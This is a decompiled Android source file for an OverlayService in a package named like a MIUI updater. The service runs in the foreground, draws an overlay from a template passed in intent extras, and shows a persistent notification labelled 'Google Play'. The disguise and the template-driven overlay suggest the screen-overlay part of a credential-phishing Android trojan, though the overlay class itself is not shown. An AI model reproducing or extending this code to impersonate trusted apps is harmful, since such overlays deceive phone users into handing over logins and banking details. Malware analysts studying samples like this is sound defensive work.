package brandmangroupe.miui.updater;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;

public class OverlayService extends Service {
    public static OverlayService instance;
    protected boolean cancelNotification = false;
    protected boolean foreground = false;
    protected int id = 0;
    private OverlayView overlayView;

    public void moveToForeground(int id, boolean cancelNotification) {
        moveToForeground(id, foregroundNotification(id), cancelNotification);
    }

    public void moveToForeground(int id, Notification notification, boolean cancelNotification) {
        if (!this.foreground && notification != null) {
            this.foreground = true;
            this.id = id;
            this.cancelNotification = cancelNotification;
            super.startForeground(id, notification);
        } else if (this.id != id && id > 0 && notification != null) {
            this.id = id;
            ((NotificationManager) getSystemService("notification")).notify(id, notification);
        }
    }

    public void moveToBackground(int id, boolean cancelNotification) {
        this.foreground = false;
        super.stopForeground(cancelNotification);
    }

    public void moveToBackground(int id) {
        moveToBackground(id, this.cancelNotification);
    }

    public String getexstras(Bundle extras, String name) {
        String out = "";
        if (extras == null || !extras.containsKey(name)) {
            return out;
        }
        return extras.getString(name);
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            Bundle extras = intent.getExtras();
            if (extras != null) {
                String tpl = getexstras(extras, "tpl");
                instance = this;
                this.overlayView = new OverlayView(this, 11, getApplicationContext(), tpl);
            }
        }
        return 1;
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
    }

    public void onDestroy() {
        super.onDestroy();
        if (this.overlayView != null) {
            this.overlayView.destory();
        }
    }

    public static void stop() {
        if (instance != null) {
            instance.stopSelf();
        }
    }

    /* access modifiers changed from: protected */
    public Notification foregroundNotification(int notificationId) {
        Notification notification = new Notification(R.drawable.play, "Google Play", System.currentTimeMillis());
        notification.flags = (notification.flags | 2) | 8;
        notification.setLatestEventInfo(this, getString(R.string.title_notification), getString(R.string.message_notification), notificationIntent());
        return notification;
    }

    private PendingIntent notificationIntent() {
        return PendingIntent.getActivity(this, 0, new Intent(this, SampleOverlayHideActivity.class), 134217728);
    }
}
